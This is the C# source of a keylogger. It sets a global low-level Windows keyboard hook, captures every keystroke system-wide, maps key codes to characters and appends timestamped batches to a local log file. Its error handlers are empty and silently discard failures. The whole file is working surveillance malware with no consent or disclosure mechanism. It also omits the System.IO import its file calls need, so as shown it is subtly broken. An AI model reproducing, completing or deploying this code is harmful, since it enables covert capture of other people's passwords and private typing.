using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace Keylogger
{
    public class SimpleKeyboardHook
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        
        private static IntPtr _hookID = IntPtr.Zero;
        private static StringBuilder _keyBuffer = new StringBuilder();
        private static string _logFilePath = "keystrokes.log";
        
        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        public static void StartHook()
        {
            try
            {
                _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, 
                    GetModuleHandle("user32.dll"), 0);
            }
            catch (Exception ex)
            {
            }
        }

        public static void StopHook()
        {
            if (_hookID != IntPtr.Zero)
            {
                UnhookWindowsHookEx(_hookID);
                _hookID = IntPtr.Zero;
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string keyPressed = GetKeyFromVirtualKey(vkCode);
                
                if (!string.IsNullOrEmpty(keyPressed))
                {
                    _keyBuffer.Append(keyPressed);
                    
                    if (_keyBuffer.Length >= 50)
                    {
                        LogKeystrokes();
                    }
                }
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static string GetKeyFromVirtualKey(int virtualKey)
        {
            switch (virtualKey)
            {
                case 8: return "[BACKSPACE]";
                case 9: return "[TAB]";
                case 13: return "[ENTER]";
                case 16: return "[SHIFT]";
                case 17: return "[CTRL]";
                case 18: return "[ALT]";
                case 20: return "[CAPS]";
                case 27: return "[ESC]";
                case 32: return " ";
                case 46: return "[DELETE]";
                case 65: return "a";
                case 66: return "b";
                case 67: return "c";
                case 68: return "d";
                case 69: return "e";
                case 70: return "f";
                case 71: return "g";
                case 72: return "h";
                case 73: return "i";
                case 74: return "j";
                case 75: return "k";
                case 76: return "l";
                case 77: return "m";
                case 78: return "n";
                case 79: return "o";
                case 80: return "p";
                case 81: return "q";
                case 82: return "r";
                case 83: return "s";
                case 84: return "t";
                case 85: return "u";
                case 86: return "v";
                case 87: return "w";
                case 88: return "x";
                case 89: return "y";
                case 90: return "z";
                case 48: return "0";
                case 49: return "1";
                case 50: return "2";
                case 51: return "3";
                case 52: return "4";
                case 53: return "5";
                case 54: return "6";
                case 55: return "7";
                case 56: return "8";
                case 57: return "9";
                default: return $"[{virtualKey}]";
            }
        }

        private static void LogKeystrokes()
        {
            try
            {
                string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                string logEntry = $"[{timestamp}] {_keyBuffer.ToString()}\r\n";
                
                File.AppendAllText(_logFilePath, logEntry, Encoding.UTF8);
                _keyBuffer.Clear();
            }
            catch (Exception ex)
            {
            }
        }

        public static string GetLogContent()
        {
            try
            {
                if (File.Exists(_logFilePath))
                {
                    return File.ReadAllText(_logFilePath, Encoding.UTF8);
                }
            }
            catch (Exception ex)
            {
            }
            return string.Empty;
        }
    }
}
